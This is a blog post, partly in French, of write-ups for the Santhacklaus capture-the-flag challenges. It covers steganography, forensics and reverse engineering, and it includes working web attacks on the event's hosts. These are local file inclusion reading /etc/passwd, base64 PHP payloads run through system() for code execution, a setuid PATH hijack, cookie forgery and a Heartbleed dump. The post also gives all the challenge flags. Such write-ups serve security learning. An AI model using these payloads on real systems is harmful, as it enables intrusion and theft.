---
layout: post
title: Santhacklaus CTF
categories: ctf
---
<!--more-->

---
## 0 Bonjour OK
---

> Just submit this flag ;) That's what you're supposed to find in every challenge and then submit to earn points !

`IMTLD{BaguetteForXMAS}`

---
## 50 I got 404 problems
---

> 404 : page not found ?

```bash
$ curl https://santhacklaus.xyz/abc
```

`IMTLD{Th3_P4g3_w4s_n0T_f0uNd}`

---
## 50 Playa del fuego
---

> We intercepted this document. Uncover the redacted part.

* pdf avec le flag en bas, ecrit en noir avec fond noir  
* copier le flag et le coller quelque part d'autre

`IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}`

---
## 50 Trashack
---

> We got in! We found something weird. Uncover the truth!

* `.jpg` avec le début du flag, ouvrir les yeux pour lire le suite

`IMTLD{P4P3}`

---
## 50 Haystack
---

> Find the needle. Be wise, patient and clever. Don't try to rush things. You only have ONE TRY....

* fichier texte avec un grand nombre de flag potentiels

```bash
$ cat challenge.txt | grep "IMTLD{" | grep "}" # merci Mel ;)
$ cat challenge.txt | grep "IMTLD{.*}"
```

`IMTLD{26650fdec09ef3ac4b602a79a0384306}`

---
## 100 Slept on the kayboard
---

> A super hacker has find a way to hide a super secret message ! Can you find the super secret message hidden by the super hacker and become a super hacker yourself ?

* QRcode qui stocke du binaire

``` bash
# binary to ascii
$ echo "obase=16; ibase=2; `zbarimg --raw -q ./qrcode.png`" | bc | xxd -ps -r # binary to b16 to ascii
9999dddd44444cccc4444bbbbbbb33334444444444000eeeeee44444888888333bbbb33399999992222220004442222222444444ddddddd
49  4D  54   4C  44  7B     43  34 74     30 6E    54   68    33 4B  33 79     62    30 34 72     64    7D
```

```python
# hex to ascii
# python3
>>> import binascii
>>> data= '494D544C447B433474306E5468334B337962303472647D'
>>> binascii.unhexlify(data)
```

`IMTLD{C4t0nTh3K3yb04rd}`

---
## 100 What's his name
---

> Johnson ! We manage to get a packet capture of the network of a hacker ! Find his password !
> Submit the flag as IMTLD{password}

* fichier `.pcapng`
* ouvir avec wireshark
* sur le premier paquet: `Analyze > Follow > TCP Stream`
* et trouver le mot de passe

`IMTLD{W4tch4_W4tch4}`

---
## 100 Authentification 2.0
---

> Did you GET it?

```bash
# requête POST avec username = admin
curl -X POST --data "username=admin" 'https://authentication.santhacklaus.xyz/'
```

`IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}`

---
## 100 Xtracted
---

> A little thug played with us. He extracted information from our server and just sent us what he got. But our engineers were unable to read it. Help us please! 😭

```bash
# with Brainfuck Interpreter we have:
POST / HTTP/1.1
Host:*51.75.202.1134
Content-Type:Japplication/x-www-form-urlencoded
Textraction_info=IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}
```

`IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}`

---
## 150 Stego101
---

> A g(r)eek riddle.

``` bash
$ file challenge2.jpg
challenge2.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: "steghide : doyouknowdaway", baseline, precision 8, 297x153, frames 3

$ steghide extract -sf challenge.jpg # password = doyouknowdaway
$ cat flag.txt
```
`IMTLD{st3g4N0gr4phY_c4N_b3_r3AllY_s1mpl3}`

---
## 150 Crackme1
---

> Grab you tools and crack me this file Billy !

```bash
$ r2 ./crack_me1
> aaa
> afl
> s main
> pdf
0x00001171      48b86861636b.  movabs rax, 0x616d72656b636168 ; 'hackerma'
0x0000117b      488945ce       mov qword [s], rax
0x0000117f      66c745d66e00   mov word [local_2ah], 0x6e  ; 'n'
0x00001185      c645b09e       mov byte [local_50h], 0x9e
0x00001189      c645b1a2       mov byte [local_4fh], 0xa2
0x0000118d      c645b2a9       mov byte [local_4eh], 0xa9
0x00001191      c645b3a1       mov byte [local_4dh], 0xa1
0x00001195      c645b499       mov byte [local_4ch], 0x99
0x00001199      c645b5d0       mov byte [local_4bh], 0xd0
0x0000119d      c645b6ae       mov byte [local_4ah], 0xae
0x000011a1      c645b785       mov byte [local_49h], 0x85
0x000011a5      c645b8ca       mov byte [local_48h], 0xca
0x000011a9      c645b996       mov byte [local_47h], 0x96
0x000011ad      c645bac7       mov byte [local_46h], 0xc7
0x000011b1      c645bb88       mov byte [local_45h], 0x88
0x000011b5      c645bc89       mov byte [local_44h], 0x89
0x000011b9      c645bd9d       mov byte [local_43h], 0x9d
0x000011bd      c645be89       mov byte [local_42h], 0x89
0x000011c1      c645bfb8       mov byte [local_41h], 0xb8
0x000011c5      c645c0c0       mov byte [local_40h], 0xc0
0x000011c9      c645c188       mov byte [local_3fh], 0x88
0x000011cd      c645c2c7       mov byte [local_3eh], 0xc7
0x000011d1      c645c39d       mov byte [local_3dh], 0x9d
0x000011d5      c645c489       mov byte [local_3ch], 0x89
0x000011d9      c645c5c7       mov byte [local_3bh], 0xc7
0x000011dd      c645c6c7       mov byte [local_3ah], 0xc7
0x000011e1      c645c7ce       mov byte [local_39h], 0xce
0x000011e5      c645c8d2       mov byte [local_38h], 0xd2
0x000011e9      c645c900       mov byte [local_37h], 0
0x000011ed      c745ec000000.  mov dword [local_14h], 0
```

```python
# on sait que le format du flag est IMTLD{...}
# python3
>>> print(ord('I'))
73
>>> print(ord('M'))
77
```
* nous avons donc un delta de 4 entre ces deux valeurs
* on remarque qu'il y a aussi un delta de 4 entre 0x9e (=158) et 0xa2 (=162)
* c'est un chiffrement par décalage de 85

```python
tab = [0x9e, 0xa2, 0xa9, 0xa1, 0x99, 0xd0, 0xae, 0x85, 0xca, 0x96, 0xc7, 0x88, 0x89, 0x9d, 0x89, 0xb8, 0xc0, 0x88, 0xc7, 0x9d, 0x89, 0xc7, 0xc7, 0xce, 0xd2]

res = ''
for i in tab:
  res += chr(i-85)
print(res)
```

`IMTLD{Y0uAr34H4ck3rH4rry}`

---
## 150 Menthal arithmetic
---

> I hope you're fast
> Host 	51.75.202.113
> Port 	10001

```bash
$ nc 51.75.202.113 10001
Welcome !!
You must calculate the square root of the 1st number, multiply the result by the cube of the 2nd number and send the integer part of the final result...
I almost forget, you only have 2 seconds to send me the result
1st number : 2077
2nd number : 3373
```

```python
#!/usr/bin/python3

import os, socket, sys
import math

serv_addr = '51.75.202.113'
port = 10001
my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    my_sock.connect((serv_addr, port))
except Exception as e:
    print('Connection problem', e.args)
    sys.exit(1)

recv1 = my_sock.recv(1024)
print(recv1)

recv2 = my_sock.recv(1024)
print(recv2)

tab = recv2.split(b' ')
print(tab)

nb1 = int(tab[3])
nb2 = int(tab[7])

print('nb1 -> ', nb1)
print('nb2 -> ', nb2)

nb1_square = math.sqrt(nb1)
print('nb1_square -> ', nb1_square)

nb2_cube = math.pow(nb2, 3)
print('nb2_cube ->', nb2_cube)

res = nb1_square * nb2_cube
print('res -> ', res)

res_int = int(res)
print('int(res) -> ', res_int)

my_sock.sendall(str(res_int).encode())

print(my_sock.recv(1024))

my_sock.close()
```

Autre version
```python
from pwn import *
from math  import *

r = remote("51.75.202.113", 10001)

print(r.recvuntil(":"))
n1 = int(r.recvline())
n2 = int(r.recvline().split(":")[1])
res = int(sqrt(n1) * pow(n2, 3))

r.send(str(res))
print(r.recv(1024))
```

`IMTLD{TheFastestManAlive}`

---
## 150 ArchDrive (1/3)
---

> A new company called ArchDrive recently launched a web storage service. Can you collect some informations, like administrator's name?

* page web avec un formulaire
* on essaye de reset le password
* on voit https://archdrive.santhacklaus.xyz/?page=reset.php
* peut-être une LFI ?

```bash
$ curl https://archdrive.santhacklaus.xyz/?page=../../../../../etc/passwd
...
G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash
...
```

`IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}`

---
## 150 The Flag Grabber
---

> Can you capture the flag ?  
> Lien: https://the-flag-grabber.santhacklaus.xyz

```html
<div id="cursor">
  <input type="submit" value="I want my flag !" name="false_button" onclick="message()">
</div>

<form method="POST" id="formulaire">
  <input type="submit" value="I want my flag !" name="button">
</form>
```

* la première `<div>` suit le curseur
* la seconde n'est pas affiché car `visibility: hidden;` en css.

```css
#formulaire {
  visibility: hidden;
}
```

* désactiver cette regle
* le bouton s'affiche, utiliser les tabulations pour se déplacer et cliquer dessus
* ou supprimer la `<div>` qui suit le curseur et cliquer sur le bouton `I want my flag`

`IMTLD{J4v4scRipT_iS_W0nD3rFuL}` 

---
## 150 On the road again
---

> The flag is... in the flag file :)  
> Host: 51.75.202.113  
> Protocol: SSH  
> Port: 51333  
> Username: challenger1  
> Password: challenger1  

```bash
$ ssh -p 51333 challenger1@51.75.202.113
$ ls -al
-r--r----- 1 admin admin         30 Dec 25 21:10 .flag
-r-sr-x--- 1 admin challenger1 8640 Dec 25 21:10 ch1
-rw-r--r-- 1 root  challenger1  117 Dec 25 21:10 ch1.c
$ cat ch1.c
int main(void) {
    system("rm /home/challenger1/.flag");
    return 0;
}

$ ./ch1
Wow don't delete the flag dude

# changer le comportement de la commande rm par cat
$ mkdir /tmp/apges01
$ cd /tmp/apges01
$ cat << end > rm
> cat /home/challenger1/.flag
> end
$ ls -al
-rw-r--r-- 1 challenger1 challenger1   28 Dec 25 21:12 rm
$ chmod +x ./rm
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games
$ export PATH=/tmp/apges01:$PATH
$ /home/challenger1/ch1
```

`IMTLD{Th1s0neW4sSymPATH3t1c2}`

---
## 150 ArchDrive (2/3)
---

> Well done ! Do you think it is possible now to gain access to a user account ?

* après quelques recherhces, on remarque que les base64 filter php fonctionnent
* `https://.../?page=php://filTer/convert.base64-encode/resource=login.php`
* dans `login.php` on voit un `myfiles.php`
* `https://.../?page=php://filTer/convert.base64-encode/resource=myfiles.php`
* on a une liste de fichiers qu'on peut récupérer


```bash
# exemple de ressource
<li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/lol.jpg">lol.jpg</a></li>

# lien associé
https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource="+ le href précédent
```

```bash
# recup.zip est protégé par un mdp
$ fcrackzip -v -D -u -p ./rockyou.txt recup.zip
$ cat password.txt
```

`IMTLD{F1nd_Y0uR_W4y}`

---
## 200 Pong
---

> Our SIEM got alerted by a surprisingly high number of ICMP requests on the network. Investigate.

* fichier `.pcapng`
* rempli avec un grand nombre de paquets ICMP
* png ? dans le l'extension
* data dans les packets ICMP ? oui

```bash
$ tshark -r ./challenge.pcapng -T fields -e data

# on remarque que les echo request et echo reply ont les même data
# il faut donc eviter les doublons
$ tshark -r ./challenge.pcapng -T fields -e data | uniq

# les données sont en base16, il faut les transformer en ascii
# on les passe en base64 puis on decode
$ shark -r ./challenge.pcapng -T fields -e data | uniq |  xxd -ps -r | base64 -d > res.png

$ file res.png
test.png: PNG image data, 487 x 272, 8-bit/color RGBA, non-interlaced
```

`IMTLD{4_s1mpl3_3xfilTR4t1oN_tECHNIQUe}`

---
## 200 QREncoded
---

> QRCoding is the new black.

* dossier rempli de QRcode de 0 à 843
* lire toutes les data et les regrouper dans un fichier ?

```python
from PIL import Image
from pyzbar.pyzbar import decode
import base64

f_start = 'part_'
f_end = '.png'

res = bytes()
i = 0
while i < 844:
    d = decode(Image.open(f_start + str(i) + f_end).convert('RGBA'))
    res += base64.b64decode(d[0].data)
    i = i + 1

print(res)

my_file = open('res', 'wb')
my_file.write(bytes(res))

my_file.close()
```

```bash
$ file res
challenge/res: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300
```

`IMTLD{qrCODES_R_3v1l}`

---
## 200 love
---

> love invitation.

```bash
$ file key.pub
key.pub: PGP public key block
```

* clé PGP ? non, beaucoup trop longue !

```bash
# decode base64
$ sed -n 4,1717p ./key.pub | base64 -d > key.b64

# on obtient une image SVG
$ file key.b64
key.b64: SVG Scalable Vector Graphics image

$ mv key.b64 key.svg
```

* on l'ouvre et `i love you`, pas de flag
* on regarde le svg
* on remarque que les couleurs sont soit noirs soit blanches
* et que opacity = 0 ? le modifier à 1 ? à 0,5 (tous les modifiers)

```bash
# en changeant toutes les valeurs de l'opacity à 0.5
$ sed 's/opacity="0"/opacity="1"/g' ./key.svg | sed 's/opacity="1"/opacity="0.5"/g' > res.svg
```

`IMTLD{y0uR_N0t_R34dy_f0r_Th1s}`

---
## 200 SRHT
---

> We have spotted a suspicious website recently published. We don't know yet if this site is a bad joke or if it belongs to a real terrorist entity. No member of our team has so far been able to connect. You have been asked to audit and infiltrate this mysterious website. Good luck !  
> Lien: https://srht.santhacklaus.xyz

* site russe bizarre
* on remarque un cookie "connexion" qui est toujours le même, avec valeur bizarre
* avec burp on remarque qu'il nous renvoi toujours le même cookie
* et si on changait le cookie ?

```bash
# requête classique avec cookie
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
Cookie: connexion=8aca4f36774f82a67c507cb9c96679482e2cc767f2d38502269557a566b092fb

# requête modifiée
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
Cookie: connexion=yolo
```

* on recoit: `Hacking Attempt Detected !!! Launching russian DDoS attack to the attacker...`
* la valeur du cookie change donc le comportement du site
* il faut maintenant trouver quelle fonction retourne la valeur de ce cookie
* peut-être une fonction de hachage ?
* partons sur fct de hash
  * `md5` : trop court
  * `sha512` : trop long
  * `sha256` : probale
* (sinon on cherche sur google le hash et on s'apercoit que c'est du sha256)

```bash
# on hash "admin"
$ echo -n "admin" | shasum -a 256
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
```

* on remplace avec ce nouveau hash, et on a :
`Are you the real administrator ?
Remember: You need to come from the "russian.deep-web.org" website with the "Black Hat Browser" navigator !`

```bash
$ nc https://srht.santhacklaus.xyz 443
GET / HTTP/1.1
Host: srht.santhacklaus.xyz
Referer: russian.deep-web.org # et non From: !!
User-Agent: Black Hat Browser
Cookie: connexion=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a91
```

`IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}`

---
## 200 3D Industry (2/2)
---

> Now that the vulnerability has been proven, the CEO is worried about some sensitive files he uploads in the administration section of the website. Let's finish this audit properly !
> Lien: https://3d-industry.santhacklaus.xyz

* voir 3D Industry (1/2)
* car même chose mais dans le dossier `admin`

```bash
echo -n "<?php echo system(\"cat admin/uploads/s3cr37-d0cum3n7.txt\"); ?>" | base64
PD9waHAgZWNobyBzeXN0ZW0oImNhdCBhZG1pbi91cGxvYWRzL3MzY3IzNy1kMGN1bTNuNy50eHQiKTsgPz4=
```
* on récupére toutes les lignes depuis le html, qu'on met dans un fichier

```bash
$ wc -c temp.txt
  675429 temp.txt

# supprimer doublons
$ cat temp.txt| uniq > temp2.txt

# bon nombre de lignes
$ wc -c temp2.txt
  337716 temp2.txt

# c'est de la base 64
$ cat temp2.txt | base64 -D > temp3.txt

# type du fichier
file temp3.txt
temp3.txt: data ????

$ head -n1 temp3.txt
SketchUp STL com.sketchup.SketchUp.2018

$ mv temp3.txt temp3.stl
```

* logiciel de dessins 3D
* [https://openjscad.org/](https://openjscad.org/)

`IMTLD{3d1s4w3s0m3}`

---
## 200 Trolloguess
---

> Many of you realized how low the guess-level was in this CTF. But some still managed to find reasons to complain.
> We're now talking to these people. We'll show you what real guessing is... Let's get ready to rumble!
> (Also, would our CTF be a real CTF without a challenge like this?)

```bash
$ binwalk ./challenge.png

# extract
$ binwalk --dd=".*" ./challenge.png

# password of zip in image with aperi'solve (step2.zip)
# new image, use "outguess tool" with password "WHAT" -> other pass
for step3.zip

$ qsstv # ubuntu
$ pactl load-module module-null-sink sink_name=virtual-cable
24
```

`IMTLD{gegegu3sSSGUEEESSING}`

---
## 200 Can you SEE the flag ?
---

> You cannot see it, and yet it's here  
> Zip file  
> PS : Call me if you need to edit a video ;)  

```bash
# mot de passe du zip
$ fcrackzip -v -u -D -p rockyou.txt Video.zip
PASSWORD FOUND!!!!: pw == cheese

# extraire le son
$ ffmpeg -i Why\ \?.mp4 -vn sound.mp3
```

* utiliser Sonic Visualiser
* `Layer > add spectrogram > All channels mixed`

`IMTLD{50sh4d3s0fS0ng}`

---
## 250 Volatility101
---

> Welcome to this introductory forensics challenge. You have been hired by your local police department to analyze a memory dump. This challenges is split into 3 steps. In each step, you will find a "Fl4g" (flag). Concatenate the three flags, separated by "_", and you will have have the final flag to validate the challenge.  
> Step 1 : find the computer name → part1  
> Step 2 : find the filename of the .zip archive on the desktop → part2 (without .zip)  
> Step 3 : recover the archive's content, you will find a file → part3  
> The final flag has to be submitted in the format `IMTLD{part1_part2_part3}**`.  
> volatilty101.zip

```bash
# Step 1
# google : volatility find hostname dump
# https://www.aldeid.com/wiki/Volatility/Retrieve-hostname

# profile
$ vol -f ./challenge.dmp imageinfo

$ vol -f ./challenge.dmp --profile=Win7SP1x86_23418 hivelist

$ vol -f ./challenge.dmp --profile=Win7SP1x86_23418 printkey -o 0x8901a1d8 -K 'ControlSet001\Control\ComputerName\ComputerName'
REG_SZ        ComputerName    : (S) WELC0M3

# autre solution
$ vol -f challenge.dmp --profile="Win7SP1x86_23418" envars | grep COMPUTERNAME
```

```bash
# Step 2
$ vol -f ./challenge.dmp --profile=Win7SP1x86_23418 filescan | grep zip
0x000000003e067440      8      0 RWD--- \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
```

```bash
# Step 3
$ vol -f ./challenge.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e067440 -D dossier

$ cd dossier

$ file file.None.0x85db26e0.dat
file.None.0x85db26e0.dat: Zip archive data, at least v1.0 to extract

$ mv file.None.0x85db26e0.dat my_file.zip

$ fcrackzip -v -u -D -p /usr/share/wordlist/rockyou.txt ./my_file.zip
PASSWORD FOUND!!!!: pw == iamhacker

$ unzip ./my_file.zip
part3.txt password:
 extracting: part3.txt

$ cat part3.txt
F0r3ns1cCLUB
```

`IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}`

---
## 250 crackme2
---

> gneugneugneu

```bash
$ r2 ./crack_me2
> aaa
> afl
> s main
> pdf
0x00001175      c645b1a9       mov byte [local_4fh], 0xa9
0x00001179      c645b2c2       mov byte [local_4eh], 0xc2
0x0000117d      c645b3cd       mov byte [local_4dh], 0xcd
0x00001181      c645b48d       mov byte [local_4ch], 0x8d
0x00001185      c645b599       mov byte [local_4bh], 0x99
0x00001189      c645b6c0       mov byte [local_4ah], 0xc0
0x0000118d      c645b7aa       mov byte [local_49h], 0xaa
0x00001191      c645b8ab       mov byte [local_48h], 0xab
0x00001195      c645b9b9       mov byte [local_47h], 0xb9
0x00001199      c645baa9       mov byte [local_46h], 0xa9
0x0000119d      c645bbc6       mov byte [local_45h], 0xc6
0x000011a1      c645bc9f       mov byte [local_44h], 0x9f
0x000011a5      c645bdbb       mov byte [local_43h], 0xbb
0x000011a9      c645beca       mov byte [local_42h], 0xca
0x000011ad      c645bfcc       mov byte [local_41h], 0xcc
0x000011b1      c645c000       mov byte [local_40h], 0
0x000011b5      c645909e       mov byte [local_70h], 0x9e
0x000011b9      c64591a2       mov byte [local_6fh], 0xa2
0x000011bd      c64592a9       mov byte [local_6eh], 0xa9
0x000011c1      c64593a1       mov byte [local_6dh], 0xa1
0x000011c5      c6459499       mov byte [local_6ch], 0x99
0x000011c9      c64595d0       mov byte [local_6bh], 0xd0
0x000011cd      c64596a9       mov byte [local_6ah], 0xa9
0x000011d1      c64597bd       mov byte [local_69h], 0xbd
0x000011d5      c6459886       mov byte [local_68h], 0x86
0x000011d9      c64599c8       mov byte [local_67h], 0xc8
0x000011dd      c6459a86       mov byte [local_66h], 0x86
0x000011e1      c6459bc8       mov byte [local_65h], 0xc8
0x000011e5      c6459ca3       mov byte [local_64h], 0xa3
0x000011e9      c6459d85       mov byte [local_63h], 0x85
0x000011ed      c6459ec9       mov byte [local_62h], 0xc9
0x000011f1      c6459f98       mov byte [local_61h], 0x98
0x000011f5      c645a0bd       mov byte [local_60h], 0xbd
0x000011f9      c645a188       mov byte [local_5fh], 0x88
0x000011fd      c645a289       mov byte [local_5eh], 0x89
0x00001201      c645a3c9       mov byte [local_5dh], 0xc9
0x00001205      c645a486       mov byte [local_5ch], 0x86
0x00001209      c645a5c3       mov byte [local_5bh], 0xc3
0x0000120d      c645a6bc       mov byte [local_5ah], 0xbc
0x00001211      c645a7d2       mov byte [local_59h], 0xd2
```

* on voit aussi un décalage de -85

```python
tab = [0x9e, 0xa2, 0xa9, 0xa1, 0x99, 0xd0, 0xa9, 0xbd, 0x86, 0xc8, 0x86, 0xc8, 0xa3, 0x85, 0xc9, 0x98, 0xbd, 0x88, 0x89, 0xc9, 0x86, 0xc3, 0xbc, 0xd2]

res = ''
for i in tab:
    res += chr(i-85)

print(res)
```

`IMTLD{Th1s1sN0tCh34t1ng}`

---
## 250 jeanclaude.vd
---

> This website has been created by a fanboy of Jean-Claude Van Damme without any background on security  
> Website : https://jeanclaudevd.santhacklaus.xyz

* https://jeanclaudevd.santhacklaus.xyz/robots.txt
* todo.txt et admin.html (-> 404)
* todo.txt:
```text
TO CHECK  Delete the admin page (server crashed while editing) <-----
TO DO     Add a contact page
TO DO     Create a Facebook page
DONE      Watch Bloodsport
DONE      Drink water, regularly
```
* fichier temporaire de vim ?
* https://jeanclaudevd.santhacklaus.xyz/.admin.html.swp

`IMTLD{ID04L0t0f1s0m3tr1cs}`

---
## 300 Only numbers here
---

> I lost my source code file so I don't remember what this server wants  
> Host 	51.75.202.113  
> Port 	20002

```bash
$ nc 51.75.202.113 20002
Welcome to this challenge !
You must find a good string
aa
The string must end with "Pinkflood"
Pinkflood
After treatment, the character b isn't a number
Pinkfloodesd
The string must end with "Pinkflood"
aaPinkflood
After treatment, the character e isn't a number
????
```
* on remarque qu'il veut que des nombres, et qu'il refuse les a b c d e f
* donc système hexa
* peut-être hash -> `After treatment`
* lequel ? sha ? md5 -> oui
* trouver une chaine qui se termine par Pinkflood et qui a un md5 avec que des nombres

```python
#!/usr/bin/env python3

import hashlib
import string

i = 0
while True:
    to_hash = f'{i}Pinkflood'
    h = hashlib.md5(to_hash.encode()).hexdigest()

    if set(h).issubset(string.digits):
        print(f'md5({to_hash}) = {h}')
        break
    i += 1


# md5(1140633Pinkflood) = 26062149783494508159682139582576
```

```bash
$ nc 51.75.202.113 20002
Welcome to this challenge !
You must find a good string
1140633Pinkflood
Congratz!!
Flag : IMTLD{Brut3F0rc31sTh3N3wBl4ck}
```

`IMTLD{Brut3F0rc31sTh3N3wBl4ck}`

---
## 400 Be my Valentine
---

> Take care of your heart (maybe also eyes)
> 51.75.202.113:1073

* ssl cert different from others site pages

metasploit
```bash
$ sudo  docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
metasploitdocker
$ msfconsole
> msf5 search heartbleed
> msf5 use auxiliary/scanner/ssl/openssl_heartbleed
> show actions
> set action DUMP
> set RHOSTS 51.75.202.113
> set RPORT 1073
> set TLS_VERSION 1.2
> set VERBOSE true
> run
```

`IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}`

---
## 400 RandomSecretmessAge
---

> We have collected some files from a strange intercepted communication. Can you investigate ?

* zip avec fichiers
* encryptedKey encryptedMessage public.key

```bash
file encryptedMessage
encryptedMessage: openssl enc'd data with salted password
```
* il faut donc un password ?

```bash
cat public.key
-----BEGIN PUBLIC KEY-----
MIIBLDANBgkqhkiG9w0BAQEFAAOCARkAMIIBFAKCAQsF5BTDOJhNS33yviCT9/eD
SPqwvCytCVcOQQj43aCYCk9+Zqa4XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyi
e512nvRDZ9o9CvjiB2xI73Bvp773gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60m
euv/DsXtFKwz8B1voj2eFEn37KfHzozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVq
D4Uc90poJbQV07ZBhpDt03Bds9y0/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57U
fadNM0ucvxyRq4b8sGOncPbEcL3NYOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pc
kswbqg9WJS91ZDMCAwEAAQ==
-----END PUBLIC KEY-----
```
* la clé parait petite
* on va utilise `RsaCtlTool`

* trouver clé privée

```bash
$ python2.7 ./RsaCtfTool.py --publickey ../public.key --private
-----BEGIN RSA PRIVATE KEY-----
MIIEUQIBAAKCAQsF5BTDOJhNS33yviCT9/eDSPqwvCytCVcOQQj43aCYCk9+Zqa4
XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyie512nvRDZ9o9CvjiB2xI73Bvp773
gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60meuv/DsXtFKwz8B1voj2eFEn37KfH
zozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVqD4Uc90poJbQV07ZBhpDt03Bds9y0
/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57UfadNM0ucvxyRq4b8sGOncPbEcL3N
YOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pckswbqg9WJS91ZDMCAwEAAQKCAQsA
jkcjL+i2g9ouvR+7+QpAyRGGi77ukvrGf0sQBKu9qGkm6iVNVe8Aroyrla7Hhuyk
uSwVHlg2JxDWHKpLEMh43PFbG2Fky/Ezer6jnTuJs5b9NOUiEB7TWq2pKZtRLiVz
CAkYMVeT2VHbWOqU7VZr66P/oghvcSUpni5kSACDsIvWJNr5/nUDGBnSnjWMVCF9
W9cpElxop/wiw/1IOg/uYK2xHv5dDCK1yPPsiSj8ZLIT0RUciUSUQmXPQxSa9vIN
4zlRD0AFSLBXo0AiXIF5c/hLTOKeOUD9Q07O8/fkEQz9d7CQIDlwMELKROxk7H6K
y1rtBmo3VHdh/B/CoLpFx93+crmaSOW2WYECBxag/ndYinMCggEEQqTif+tJiKn4
fG5uGuMBVqBnT5YFq6mwa73c6eR5i1jsN0m2wNmnru4dODZn96Y2t58kGnNMrAZr
BqPg/5Hr/P0/p07nv3+KWR1Y2LZwehkKmBcJMRMU7bQeE5jgGutHBN3eVWphGzM0
jg3FQbJyVfEGoL5P8YmbOEnbaPHbtEInOXS587h60ZngGDe4zpjRj9HXq13fSbYi
3LbuJrgqru0E0u/z49PQkQyPwNMTYLFio2ekm23o/inZZAHEHPv86DIZIgJDNa1n
6Vr7qzRMI3c42LIpFUwC0m0elv9Pj6Szd5v5Xv1wzlw7GqIBdGLxM5hVmJMiPhil
721SVCOknEPMj0ECBxNbYnG65qsCggEEJET+K+YOT/1JCddDvwg6Sz3i29Jm5aTl
Kc3bs8MvTuInNHO+rTgHZVGbv2MEtCfWcZp/mJGVca3Qg32ezxhIWZguE00DHRo5
XgR1vQOVNS35sQoga3/aDP/QupOhq6TOMtzYyp2pmZcFjCX8a6PFS/Zvx/2rHmXo
fvrbGUM/cdvq4v8e0IBe/0GCT0vMHUvYCTCH8nCVO9WPJZW9CH+EY00FKhODJUO6
p6Yxehyl2CLR7uJSGHD5s5FtCVtYsvmFC41wVizrDQSBn+NvQh6lLUwOOQjFCR0k
EAdo9X6feyqErZzKW6MMyJIzbGws5H2QjabjNrUklqztad+SRc5cINtZMcECBxBu
4HDBiUQ=
-----END RSA PRIVATE KEY-----

# déchiffrer encryptedKey
$ python2.7 ./RsaCtfTool.py --publickey ../public.key --uncipherfile ../encryptedKey
Clear text : .......... My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y

# My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y est sûrement la clé de encryptedMessage
$ openssl enc -aes-256-cbc -d -in ../encryptedMessage -out file.txt -k "My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y"

$ cat file.txt
```

`IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}`

---
## 400 3D Industry (1/2)
---

> 3D Industry is a freshly launched startup which is specialized in 3D printing. The CEO has some doubts about the secured development of the website. Can you prove him that his doubts are well-founded ?  
> Lien: https://3d-industry.santhacklaus.xyz

* https://3d-industry.santhacklaus.xyz/index.php?file=services.php
* on remarque rapidement que la faille peut venir de l'url, peut-être une LFI ?
* après avoir testé des trucs basiques, rien d'utile
* par contre le module base64 fonctionne:

```bash
$ echo -n "<?php echo "yolo"; ?>" | base64
PD9waHAgZWNobyB5b2xvOyA/Pg==
```
* ce lien affiche bien yolo, le code est donc executé
https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgZWNobyB5b2xvOyA/Pg==

```bash
# on fait un ls avec system()
$ echo -n "<?php echo system(\"ls -al\"); ?>" | base64
PD9waHAgZWNobyBzeXN0ZW0oImxzIC1hbCIpOyA/Pg==

# on remarque un dossier .hidden
# on navigue
$ echo -n "<?php echo system(\"ls -al .hidden/this/is/the/path/to/the/flag/\") ?>" | base64
PD9waHAgZWNobyBzeXN0ZW0oImxzIC1hbCAuaGlkZGVuL3RoaXMvaXMvdGhlL3BhdGgvdG8vdGhlL2ZsYWcvIikgPz4=

# on trouve un flag.txt
$ echo -n "<?php echo system(\"cat .hidden/this/is/the/path/to/the/flag/flag.txt\") ?>" | base64
https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oImNhdCAuaGlkZGVuL3RoaXMvaXMvdGhlL3BhdGgvdG8vdGhlL2ZsYWcvZmxhZy50eHQiKSA/Pg==
```

`IMTLD{B3w4r30fURL1nclud3}IMTLD{B3w4r30fURL1nclud3}` 

---
## 450 j.l.c.s.v.b.d
---

> You'll get JCVDed

* stegsolv rapidement

* qrcode in the image
